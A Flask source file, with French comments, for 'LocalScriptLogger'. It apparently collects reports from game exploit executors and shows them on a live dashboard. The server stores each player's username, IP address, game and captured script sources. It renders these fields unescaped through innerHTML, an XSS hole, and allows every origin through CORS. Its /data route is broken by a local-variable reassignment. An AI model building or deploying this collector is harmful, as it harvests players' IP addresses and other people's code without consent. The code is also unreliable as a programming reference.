from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS  # LIGNE MAGIQUE QUI FIXE TOUT
import os

app = Flask(__name__)
CORS(app)  # Active CORS → le navigateur peut fetch /data sans se faire bloquer

players = {}

HTML = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>LocalScriptLogger - LIVE</title>
    <style>
        body {background:#000;color:#0f0;font-family:Consolas;margin:0;padding:20px;}
        h1 {text-align:center;color:#0f0;text-shadow:0 0 20px #0f0;}
        .player {background:#111;padding:15px;margin:10px 0;border-left:5px solid #0f0;border-radius:8px;cursor:pointer;}
        .player:hover {background:#1a1a1a;}
        .scripts {display:none;background:#222;padding:15px;margin-top:10px;border-radius:8px;}
        .script {background:#333;padding:10px;margin:8px 0;border-radius:5px;cursor:pointer;}
        .script:hover {background:#444;}
        pre {background:#000;padding:15px;border-radius:8px;overflow:auto;max-height:600px;white-space:pre-wrap;}
        .info {font-size:0.9em;color:#aaa;}
        .online {color:#0f0; font-weight:bold;}
    </style>
</head>
<body>
    <h1>LOCALSCRIPTLOGGER - EN LIGNE</h1>
    <div id="status">Connexion en cours...</div>
    <div id="players"></div>

    <script>
        function update() {
            fetch("/data")
                .then(r => r.json())
                .then(data => {
                    document.getElementById("status").innerHTML = `<span class="online">Connecté – ${Object.keys(data).length} joueur(s) en ligne</span>`;
                    const container = document.getElementById("players");
                    container.innerHTML = "";
                    if (Object.keys(data).length === 0) {
                        container.innerHTML = "<p style='text-align:center;color:#666'>Aucun joueur connecté pour le moment...</p>";
                        return;
                    }
                    Object.entries(data).forEach(([id, p]) => {
                        const div = document.createElement("div");
                        div.className = "player";
                        div.onclick = () => {
                            const scripts = document.getElementById('scripts_'+id);
                            scripts.style.display = scripts.style.display === 'block' ? 'none' : 'block';
                        };
                        div.innerHTML = `<strong>${p.username || "Unknown"}</strong> (${p.executor || "Unknown"})<br>
                                         <span class="info">IP: ${p.ip} | Jeu: ${p.game || "Inconnu"} | Scripts: ${p.scripts.length}</span>`;
                        container.appendChild(div);

                        const scriptsDiv = document.createElement("div");
                        scriptsDiv.id = "scripts_"+id;
                        scriptsDiv.className = "scripts";
                        p.scripts.forEach((s, i) => {
                            const scriptEl = document.createElement("div");
                            scriptEl.className = "script";
                            scriptEl.innerHTML = `<strong>${s.name}</strong> (${s.class}) → ${s.parent || "Unknown"}`;
                            scriptEl.onclick = (e) => {
                                e.stopPropagation();
                                document.getElementById('modalCode').textContent = s.source || "Source inaccessible";
                                document.getElementById('modal').style.display = 'block';
                            };
                            scriptsDiv.appendChild(scriptEl);
                        });
                        container.appendChild(scriptsDiv);
                    });
                })
                .catch(err => {
                    document.getElementById("status").textContent = "Erreur de connexion au serveur";
                });
        }
        setInterval(update, 3000);
        update();
    </script>

    <div id="modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;padding:20px;overflow:auto;">
        <button onclick="this.parentElement.style.display='none'" style="position:fixed;top:10px;right:20px;padding:10px 20px;background:#f00;color:#fff;border:none;cursor:pointer;font-size:1.2em;">FERMER</button>
        <pre id="modalCode"></pre>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["POST"])
def api():
    try:
        data = request.get_json(silent=True) or {}
        uid = str(data.get("userid", ""))
        if not uid: return jsonify({"ok": False})

        if data.get("action") == "register":
            players[uid] = {
                "username": data.get("username", "Unknown"),
                "executor": data.get("executor", "Unknown"),
                "ip": data.get("ip", "Unknown"),
                "game": data.get("game", "Unknown"),
                "scripts": data.get("scripts", [])
            }
        elif data.get("action") == "heartbeat" and uid in players:
            players[uid]["last_seen"] = True
    except: pass
    return jsonify({"ok": True})

@app.route("/data")
def get_data():
    # Nettoie les joueurs inactifs
    players = {k: v for k, v in players.items() if v.get("last_seen")}
    return jsonify(players)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
